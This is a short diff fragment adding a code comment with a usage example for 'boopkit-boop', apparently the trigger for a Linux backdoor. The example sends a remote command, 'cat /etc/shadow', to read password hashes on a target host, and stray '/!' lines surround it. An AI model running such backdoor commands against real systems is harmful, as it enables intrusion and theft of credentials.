@@ -1,0 +1,14 @@
+/!
+/!
+###
+/!
+// # rhost, rport, lhost, lport MUST be set for full TCP connections
+//
+// boopkit-boop \
+//      -lhost 10.0.0.100 \
+//      -lport 4343 \
+//      -rhost 10.0.0.101 \
+//      -rport 22 \
+//      -c "cat /etc/shadow"
+//
+/!
